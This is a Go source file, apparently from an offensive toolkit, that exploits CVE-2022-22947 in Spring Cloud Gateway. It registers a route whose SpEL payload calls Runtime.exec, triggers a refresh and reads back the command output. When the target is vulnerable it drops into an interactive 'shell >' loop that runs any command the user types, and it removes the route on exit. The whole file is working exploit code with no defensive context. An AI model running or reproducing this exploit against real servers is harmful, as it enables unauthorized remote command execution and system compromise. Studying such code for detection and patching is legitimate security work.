package exppackage

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"os"
	"ssp/common"
	"strings"
	"time"
)

func CVE_2022_22947(url string) {

	endpoint1 := "actuator/gateway/routes/hacktest"
	endpoint2 := "actuator/gateway/refresh"

	oldHeader1 := map[string]string{
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "*/*",
		"Accept-Language": "en",
		"User-Agent":      common.GetRandomUserAgent(),
		"Content-Type":    "application/json",
	}

	oldHeader2 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"Content-Type": "application/x-www-form-urlencoded",
	}

	headers1 := common.MergeHeaders(oldHeader1)
	headers2 := common.MergeHeaders(oldHeader2)

	payload := `{
              "id": "hacktest",
              "filters": [{
                "name": "AddResponseHeader",
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}
                }],
              "uri": "http://example.com",
              "order": 0
            }`

	payload2 := `{
              "id": "hacktest",
              "filters": [{
                "name": "AddResponseHeader",
                "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"}
                }],
              "uri": "http://example.com",
              "order": 0
            }`

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	urltest := url + endpoint1
	req1, err := http.NewRequest("POST", urltest, strings.NewReader(payload))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers1 {
		req1.Header.Set(key, value)
	}
	resp1, err := client.Do(req1)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp1.Body.Close()

	_, err = ioutil.ReadAll(resp1.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	refreshURL := url + endpoint2
	req2, err := http.NewRequest("POST", refreshURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers2 {
		req2.Header.Set(key, value)
	}
	_, err = client.Do(req2)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}

	routesURL := url + endpoint1
	req3, err := http.NewRequest("GET", routesURL, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}
	for key, value := range headers2 {
		req3.Header.Set(key, value)
	}
	resp3, err := client.Do(req3)
	if err != nil {
		color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
		return
	}
	defer resp3.Body.Close()

	body, err := ioutil.ReadAll(resp3.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return
	}

	if strings.Contains(string(body), "uid=") && strings.Contains(string(body), "gid=") && strings.Contains(string(body), "groups=") {
		common.PrintVulnerabilityConfirmation("CVE-2022-22947", url, "Null", "3")
		color.Red("[+] Payload已经输出，回显结果如下：")
		res := common.ExtractResult(string(body), `s*'([^']*)'`)
		result := strings.Replace(res, "\\n", "\n", -1)
		fmt.Println(result)
		for {
			var Cmd string
			reader := bufio.NewReader(os.Stdin)

			fmt.Print("shell > ")
			Cmd, _ = reader.ReadString('\n')
			Cmd = strings.TrimSpace(Cmd)
			//Cmd = strings.Replace(Cmd, " ", "+", -1)
			if Cmd == "exit" {
				req4, err := http.NewRequest("DELETE", urltest, nil)
				if err != nil {
					fmt.Println("Error creating request:", err)
					return
				}
				for key, value := range headers2 {
					req4.Header.Set(key, value)
				}
				_, err = client.Do(req4)
				if err != nil {
					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
					return
				}

				_, err = client.Do(req2)
				if err != nil {
					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
					return
				}
				os.Exit(0)
			} else {
				payload3 := strings.ReplaceAll(payload2, "whoami", Cmd)
				req1, err := http.NewRequest("POST", urltest, strings.NewReader(payload3))
				if err != nil {
					fmt.Println("Error creating request:", err)
					return
				}
				for key, value := range headers1 {
					req1.Header.Set(key, value)
				}
				_, err = client.Do(req1)
				if err != nil {
					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
					return
				}

				_, err = client.Do(req2)
				if err != nil {
					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
					return
				}

				resp3, err := client.Do(req3)
				if err != nil {
					color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
					return
				}
				defer resp3.Body.Close()

				body, err := ioutil.ReadAll(resp3.Body)
				if err != nil {
					fmt.Println("Error reading response:", err)
					return
				}

				res := common.ExtractResult(string(body), `s*'([^']*)'`)
				result := strings.Replace(res, "\\n", "\n", -1)
				fmt.Println(result)
			}
		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22947远程命令执行漏洞\n", url)
	}
}
